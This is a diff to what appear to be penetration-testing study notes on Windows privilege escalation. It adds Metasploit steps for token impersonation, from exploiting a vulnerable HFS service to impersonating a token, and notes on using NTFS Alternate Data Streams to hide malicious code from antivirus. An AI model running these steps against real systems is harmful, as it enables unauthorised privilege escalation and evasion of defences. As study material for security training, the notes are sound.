@@ -70,4 +70,26 @@ The following are the privileges that are required for a successful impersonatio
 #### Access Token Impersonation
 
 1. Get a meterpreter session exploiting vulnerable service ( `use exploit/windows/http/rejetto_hfs_exec`)
-2. load incognito
+2. `load incognito`
+3. `list_tokens -u`
+4. `impersonate_token "TOKEN_NAME"`
+
+---
+
+# Alternate Data Streams (ADS)
+
+*ADS is an NTFS (New Technology File System) file attribute and was designed to provide compatibility with the MacOS HFS (Hierarchical File System).*
+
+● **Any file created on an NTFS formatted drive** will have two different forks/streams:
+- ***Data stream*** - Default stream that contains the data of the file.
+- ***Resource stream*** - Typically contains the metadata of the file.
+
+● Attackers can *use ADS to hide malicious code or executables* in legitimate files in order to evade detection.
+● This can be done by **storing the malicious code or executables in the file attribute resource stream (metadata)** of a legitimate file.
+● This technique is **usually used to evade basic signature based AVs and static scanning tools.**
+
+#### Using ADS
+
+```bash
+notepad text.txt:secret.txt
+```
